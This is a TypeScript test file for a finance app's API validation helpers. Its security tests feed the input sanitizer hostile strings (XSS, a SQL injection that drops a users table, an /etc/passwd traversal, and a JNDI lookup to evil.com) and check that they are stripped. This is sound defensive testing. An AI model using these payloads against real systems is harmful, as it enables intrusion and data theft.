// API Validation Tests - Comprehensive Coverage
// Testing request validation, sanitization, and security measures

import {
  validateStockSymbol,
  validateEmail,
  validatePassword,
  validatePortfolioData,
  validateMarketDataRequest,
  validateUserInput,
  sanitizeInput,
  validateApiKey,
  validateDateRange,
  validateNumericInput,
  validatePaginationParams,
  validateSortParams,
  validateFilterParams,
  rateLimitCheck,
  validateRequestHeaders,
  validateJsonSchema,
  validateFileUpload,
  validateWebhookPayload,
} from '@/lib/utils/api-validation';

describe('API Validation Tests - Comprehensive', () => {
  describe('Stock Symbol Validation', () => {
    test('should validate US stock symbols', () => {
      expect(validateStockSymbol('AAPL')).toBe(true);
      expect(validateStockSymbol('MSFT')).toBe(true);
      expect(validateStockSymbol('GOOGL')).toBe(true);
      expect(validateStockSymbol('TSLA')).toBe(true);
      expect(validateStockSymbol('BRK.A')).toBe(true);
    });

    test('should validate Brazilian stock symbols', () => {
      expect(validateStockSymbol('PETR4')).toBe(true);
      expect(validateStockSymbol('VALE3')).toBe(true);
      expect(validateStockSymbol('ITUB4')).toBe(true);
      expect(validateStockSymbol('BBDC4')).toBe(true);
      expect(validateStockSymbol('ABEV3')).toBe(true);
    });

    test('should reject invalid stock symbols', () => {
      expect(validateStockSymbol('')).toBe(false);
      expect(validateStockSymbol('A')).toBe(false); // Too short
      expect(validateStockSymbol('TOOLONG')).toBe(false); // Too long
      expect(validateStockSymbol('123')).toBe(false); // Numbers only
      expect(validateStockSymbol('AAPL@')).toBe(false); // Special characters
      expect(validateStockSymbol('aapl')).toBe(false); // Lowercase
    });

    test('should handle edge cases', () => {
      expect(validateStockSymbol(null as any)).toBe(false);
      expect(validateStockSymbol(undefined as any)).toBe(false);
      expect(validateStockSymbol(123 as any)).toBe(false);
      expect(validateStockSymbol(' AAPL ')).toBe(false); // Whitespace
    });
  });

  describe('Email Validation', () => {
    test('should validate correct email formats', () => {
      expect(validateEmail('user@example.com')).toBe(true);
      expect(validateEmail('test.email@domain.co.uk')).toBe(true);
      expect(validateEmail('user+tag@example.org')).toBe(true);
      expect(validateEmail('firstname.lastname@company.com')).toBe(true);
      expect(validateEmail('user123@test-domain.com')).toBe(true);
    });

    test('should reject invalid email formats', () => {
      expect(validateEmail('')).toBe(false);
      expect(validateEmail('invalid')).toBe(false);
      expect(validateEmail('@domain.com')).toBe(false);
      expect(validateEmail('user@')).toBe(false);
      expect(validateEmail('user@domain')).toBe(false);
      expect(validateEmail('user.domain.com')).toBe(false);
      expect(validateEmail('user@domain.')).toBe(false);
    });

    test('should handle special cases', () => {
      expect(validateEmail('user@domain..com')).toBe(false); // Double dots
      expect(validateEmail('user..name@domain.com')).toBe(false); // Double dots in local
      expect(validateEmail('user@domain-.com')).toBe(false); // Hyphen at end
      expect(validateEmail('user@-domain.com')).toBe(false); // Hyphen at start
    });
  });

  describe('Password Validation', () => {
    test('should validate strong passwords', () => {
      expect(validatePassword('StrongPass123!')).toBe(true);
      expect(validatePassword('MySecure@Pass2024')).toBe(true);
      expect(validatePassword('Complex#Password1')).toBe(true);
      expect(validatePassword('Valid$Pass123')).toBe(true);
    });

    test('should reject weak passwords', () => {
      expect(validatePassword('weak')).toBe(false); // Too short
      expect(validatePassword('password')).toBe(false); // No uppercase/numbers/special
      expect(validatePassword('PASSWORD')).toBe(false); // No lowercase/numbers/special
      expect(validatePassword('12345678')).toBe(false); // No letters/special
      expect(validatePassword('Password')).toBe(false); // No numbers/special
      expect(validatePassword('Password123')).toBe(false); // No special characters
    });

    test('should handle edge cases', () => {
      expect(validatePassword('')).toBe(false);
      expect(validatePassword(null as any)).toBe(false);
      expect(validatePassword(undefined as any)).toBe(false);
      expect(validatePassword('   ')).toBe(false); // Whitespace only
    });
  });

  describe('Portfolio Data Validation', () => {
    test('should validate correct portfolio data', () => {
      const validPortfolio = {
        name: 'My Portfolio',
        positions: [
          { symbol: 'AAPL', quantity: 100, averagePrice: 150.50 },
          { symbol: 'MSFT', quantity: 50, averagePrice: 300.25 },
        ],
        totalValue: 25012.50,
        currency: 'USD',
      };

      expect(validatePortfolioData(validPortfolio)).toBe(true);
    });

    test('should reject invalid portfolio data', () => {
      const invalidPortfolios = [
        { name: '', positions: [] }, // Empty name
        { name: 'Portfolio', positions: null }, // Null positions
        { name: 'Portfolio', positions: [{ symbol: '', quantity: 100 }] }, // Invalid symbol
        { name: 'Portfolio', positions: [{ symbol: 'AAPL', quantity: -10 }] }, // Negative quantity
        { name: 'Portfolio', positions: [{ symbol: 'AAPL', quantity: 0 }] }, // Zero quantity
      ];

      invalidPortfolios.forEach(portfolio => {
        expect(validatePortfolioData(portfolio)).toBe(false);
      });
    });
  });

  describe('Market Data Request Validation', () => {
    test('should validate market data requests', () => {
      const validRequests = [
        { symbol: 'AAPL', timeframe: '1D', indicators: ['RSI', 'MACD'] },
        { symbol: 'MSFT', timeframe: '1H', startDate: '2024-01-01', endDate: '2024-01-31' },
        { symbols: ['AAPL', 'MSFT', 'GOOGL'], timeframe: '5M' },
      ];

      validRequests.forEach(request => {
        expect(validateMarketDataRequest(request)).toBe(true);
      });
    });

    test('should reject invalid market data requests', () => {
      const invalidRequests = [
        { symbol: '', timeframe: '1D' }, // Empty symbol
        { symbol: 'AAPL', timeframe: 'INVALID' }, // Invalid timeframe
        { symbol: 'AAPL', timeframe: '1D', startDate: 'invalid-date' }, // Invalid date
        { symbols: [], timeframe: '1D' }, // Empty symbols array
        { symbol: 'AAPL' }, // Missing timeframe
      ];

      invalidRequests.forEach(request => {
        expect(validateMarketDataRequest(request)).toBe(false);
      });
    });
  });

  describe('Input Sanitization', () => {
    test('should sanitize HTML input', () => {
      const maliciousInput = '<script>alert("XSS")</script><p>Safe content</p>';
      const sanitized = sanitizeInput(maliciousInput);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Safe content');
    });

    test('should sanitize SQL injection attempts', () => {
      const sqlInjection = "'; DROP TABLE users; --";
      const sanitized = sanitizeInput(sqlInjection);
      
      expect(sanitized).not.toContain('DROP TABLE');
      expect(sanitized).not.toContain('--');
      expect(sanitized).not.toContain(';');
    });

    test('should preserve safe content', () => {
      const safeInput = 'This is safe content with numbers 123 and symbols @#$';
      const sanitized = sanitizeInput(safeInput);
      
      expect(sanitized).toBe(safeInput);
    });
  });

  describe('API Key Validation', () => {
    test('should validate API key formats', () => {
      expect(validateApiKey('sk-1234567890abcdef1234567890abcdef')).toBe(true);
      expect(validateApiKey('pk_test_1234567890abcdef')).toBe(true);
      expect(validateApiKey('api_key_1234567890abcdef1234567890abcdef')).toBe(true);
    });

    test('should reject invalid API keys', () => {
      expect(validateApiKey('')).toBe(false);
      expect(validateApiKey('short')).toBe(false);
      expect(validateApiKey('invalid-key-format')).toBe(false);
      expect(validateApiKey('123')).toBe(false);
    });
  });

  describe('Date Range Validation', () => {
    test('should validate correct date ranges', () => {
      const validRanges = [
        { start: '2024-01-01', end: '2024-01-31' },
        { start: '2023-12-01', end: '2024-01-01' },
        { start: new Date('2024-01-01'), end: new Date('2024-01-31') },
      ];

      validRanges.forEach(range => {
        expect(validateDateRange(range.start, range.end)).toBe(true);
      });
    });

    test('should reject invalid date ranges', () => {
      const invalidRanges = [
        { start: '2024-01-31', end: '2024-01-01' }, // End before start
        { start: 'invalid-date', end: '2024-01-31' }, // Invalid start date
        { start: '2024-01-01', end: 'invalid-date' }, // Invalid end date
        { start: '', end: '2024-01-31' }, // Empty start date
      ];

      invalidRanges.forEach(range => {
        expect(validateDateRange(range.start, range.end)).toBe(false);
      });
    });
  });

  describe('Numeric Input Validation', () => {
    test('should validate numeric inputs', () => {
      expect(validateNumericInput(123)).toBe(true);
      expect(validateNumericInput(123.45)).toBe(true);
      expect(validateNumericInput('123')).toBe(true);
      expect(validateNumericInput('123.45')).toBe(true);
      expect(validateNumericInput(0)).toBe(true);
      expect(validateNumericInput(-123)).toBe(true);
    });

    test('should reject invalid numeric inputs', () => {
      expect(validateNumericInput('abc')).toBe(false);
      expect(validateNumericInput('')).toBe(false);
      expect(validateNumericInput(null)).toBe(false);
      expect(validateNumericInput(undefined)).toBe(false);
      expect(validateNumericInput(NaN)).toBe(false);
      expect(validateNumericInput(Infinity)).toBe(false);
    });

    test('should validate numeric ranges', () => {
      expect(validateNumericInput(50, { min: 0, max: 100 })).toBe(true);
      expect(validateNumericInput(0, { min: 0, max: 100 })).toBe(true);
      expect(validateNumericInput(100, { min: 0, max: 100 })).toBe(true);
      
      expect(validateNumericInput(-1, { min: 0, max: 100 })).toBe(false);
      expect(validateNumericInput(101, { min: 0, max: 100 })).toBe(false);
    });
  });

  describe('Pagination Parameters', () => {
    test('should validate pagination parameters', () => {
      expect(validatePaginationParams({ page: 1, limit: 10 })).toBe(true);
      expect(validatePaginationParams({ page: 5, limit: 50 })).toBe(true);
      expect(validatePaginationParams({ page: 1, limit: 100 })).toBe(true);
    });

    test('should reject invalid pagination parameters', () => {
      expect(validatePaginationParams({ page: 0, limit: 10 })).toBe(false); // Page < 1
      expect(validatePaginationParams({ page: 1, limit: 0 })).toBe(false); // Limit < 1
      expect(validatePaginationParams({ page: 1, limit: 1001 })).toBe(false); // Limit too high
      expect(validatePaginationParams({ page: -1, limit: 10 })).toBe(false); // Negative page
    });
  });

  describe('Sort Parameters', () => {
    test('should validate sort parameters', () => {
      const validSorts = [
        { field: 'name', direction: 'asc' },
        { field: 'price', direction: 'desc' },
        { field: 'date', direction: 'asc' },
      ];

      validSorts.forEach(sort => {
        expect(validateSortParams(sort)).toBe(true);
      });
    });

    test('should reject invalid sort parameters', () => {
      const invalidSorts = [
        { field: '', direction: 'asc' }, // Empty field
        { field: 'name', direction: 'invalid' }, // Invalid direction
        { field: 'invalid_field', direction: 'asc' }, // Invalid field
        { direction: 'asc' }, // Missing field
        { field: 'name' }, // Missing direction
      ];

      invalidSorts.forEach(sort => {
        expect(validateSortParams(sort)).toBe(false);
      });
    });
  });

  describe('Filter Parameters', () => {
    test('should validate filter parameters', () => {
      const validFilters = [
        { field: 'status', operator: 'eq', value: 'active' },
        { field: 'price', operator: 'gte', value: 100 },
        { field: 'date', operator: 'between', value: ['2024-01-01', '2024-01-31'] },
      ];

      validFilters.forEach(filter => {
        expect(validateFilterParams(filter)).toBe(true);
      });
    });

    test('should reject invalid filter parameters', () => {
      const invalidFilters = [
        { field: '', operator: 'eq', value: 'test' }, // Empty field
        { field: 'status', operator: 'invalid', value: 'test' }, // Invalid operator
        { field: 'status', operator: 'eq' }, // Missing value
        { operator: 'eq', value: 'test' }, // Missing field
      ];

      invalidFilters.forEach(filter => {
        expect(validateFilterParams(filter)).toBe(false);
      });
    });
  });

  describe('Rate Limiting', () => {
    test('should check rate limits', async () => {
      const clientId = 'test-client-123';
      
      // First request should pass
      const result1 = await rateLimitCheck(clientId, 'api_call');
      expect(result1.allowed).toBe(true);
      expect(result1.remaining).toBeGreaterThan(0);
      
      // Should have rate limit info
      expect(result1).toHaveProperty('resetTime');
      expect(result1).toHaveProperty('limit');
    });

    test('should handle rate limit exceeded', async () => {
      const clientId = 'rate-limited-client';
      
      // Simulate many requests
      const promises = Array.from({ length: 200 }, () => 
        rateLimitCheck(clientId, 'api_call')
      );
      
      const results = await Promise.all(promises);
      const blockedRequests = results.filter(r => !r.allowed);
      
      expect(blockedRequests.length).toBeGreaterThan(0);
    });
  });

  describe('Request Headers Validation', () => {
    test('should validate required headers', () => {
      const validHeaders = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer token123',
        'User-Agent': 'PennyWise/1.0',
      };

      expect(validateRequestHeaders(validHeaders)).toBe(true);
    });

    test('should reject missing required headers', () => {
      const invalidHeaders = [
        {}, // No headers
        { 'Content-Type': 'application/json' }, // Missing Authorization
        { 'Authorization': 'Bearer token123' }, // Missing Content-Type
        { 'Content-Type': 'text/plain', 'Authorization': 'Bearer token123' }, // Wrong Content-Type
      ];

      invalidHeaders.forEach(headers => {
        expect(validateRequestHeaders(headers)).toBe(false);
      });
    });
  });

  describe('JSON Schema Validation', () => {
    test('should validate against JSON schema', () => {
      const schema = {
        type: 'object',
        properties: {
          name: { type: 'string' },
          age: { type: 'number', minimum: 0 },
          email: { type: 'string', format: 'email' },
        },
        required: ['name', 'email'],
      };

      const validData = {
        name: 'John Doe',
        age: 30,
        email: 'john@example.com',
      };

      expect(validateJsonSchema(validData, schema)).toBe(true);
    });

    test('should reject invalid data against schema', () => {
      const schema = {
        type: 'object',
        properties: {
          name: { type: 'string' },
          age: { type: 'number', minimum: 0 },
        },
        required: ['name'],
      };

      const invalidData = [
        {}, // Missing required field
        { name: 123 }, // Wrong type
        { name: 'John', age: -5 }, // Below minimum
      ];

      invalidData.forEach(data => {
        expect(validateJsonSchema(data, schema)).toBe(false);
      });
    });
  });

  describe('File Upload Validation', () => {
    test('should validate file uploads', () => {
      const validFile = {
        name: 'portfolio.csv',
        size: 1024 * 1024, // 1MB
        type: 'text/csv',
      };

      expect(validateFileUpload(validFile)).toBe(true);
    });

    test('should reject invalid file uploads', () => {
      const invalidFiles = [
        { name: 'file.exe', size: 1024, type: 'application/exe' }, // Invalid type
        { name: 'large.csv', size: 10 * 1024 * 1024, type: 'text/csv' }, // Too large
        { name: '', size: 1024, type: 'text/csv' }, // No name
        { name: 'file.csv', size: 0, type: 'text/csv' }, // Empty file
      ];

      invalidFiles.forEach(file => {
        expect(validateFileUpload(file)).toBe(false);
      });
    });
  });

  describe('Webhook Payload Validation', () => {
    test('should validate webhook payloads', () => {
      const validPayload = {
        event: 'portfolio.updated',
        timestamp: new Date().toISOString(),
        data: {
          portfolioId: '123',
          changes: ['position_added'],
        },
        signature: 'valid_signature_hash',
      };

      expect(validateWebhookPayload(validPayload)).toBe(true);
    });

    test('should reject invalid webhook payloads', () => {
      const invalidPayloads = [
        { event: '', timestamp: new Date().toISOString() }, // Empty event
        { event: 'test', timestamp: 'invalid-date' }, // Invalid timestamp
        { event: 'test', timestamp: new Date().toISOString(), signature: '' }, // Empty signature
      ];

      invalidPayloads.forEach(payload => {
        expect(validateWebhookPayload(payload)).toBe(false);
      });
    });
  });

  describe('Security Validation', () => {
    test('should detect and prevent common attacks', () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        "'; DROP TABLE users; --",
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        'javascript:alert(1)',
      ];

      maliciousInputs.forEach(input => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized).not.toContain('../');
        expect(sanitized).not.toContain('jndi:');
        expect(sanitized).not.toContain('javascript:');
      });
    });

    test('should validate CSRF tokens', () => {
      const validToken = 'csrf_token_1234567890abcdef';
      const invalidTokens = ['', 'short', 'invalid-format'];

      expect(validateApiKey(validToken)).toBe(true);
      invalidTokens.forEach(token => {
        expect(validateApiKey(token)).toBe(false);
      });
    });
  });
});
